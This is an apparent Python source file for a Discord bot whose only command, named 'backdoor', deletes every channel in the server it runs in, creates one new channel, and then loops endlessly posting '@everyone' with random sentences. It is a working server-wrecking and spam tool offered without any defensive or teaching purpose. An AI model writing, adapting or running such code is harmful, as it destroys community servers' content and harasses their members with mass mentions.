# BY // MISHASOK

import discord
from discord.ext import commands
from config import *
from discord.utils import get
import time
import random

RUNNING = True
bot = commands.Bot(command_prefix=settings['prefix'])
channels_mass = []
intents = discord.Intents.all()


@bot.event
async def on_ready():
    for channel in bot.get_guild(settings['server_id']).channels:
        channels_mass.append(channel.id)
    print(bot.user.name)
    print(bot.user.id)
    bot_id = bot.user.id


@bot.command()
async def backdoor(ctx):
    try:
        guild = ctx.guild
        for channel in guild.channels:
            await channel.delete()
        guild = ctx.message.guild
        await guild.create_text_channel(settings['channel_name'])

        channel = discord.utils.get(ctx.guild.channels, name=settings['channel_name'])
        channel_id = channel.id
        channel = await bot.fetch_channel(channel_id)
        last = ''
        while RUNNING:
            now = random.choice(funny_sentenses)
            if now != last:
                await channel.send(f'@everyone {now}')
                last = now
            else:
                continue
            time.sleep(0.5)
    except Exception as Error:
        print('Backdoor command error:', Error)


bot.run(settings['token'])
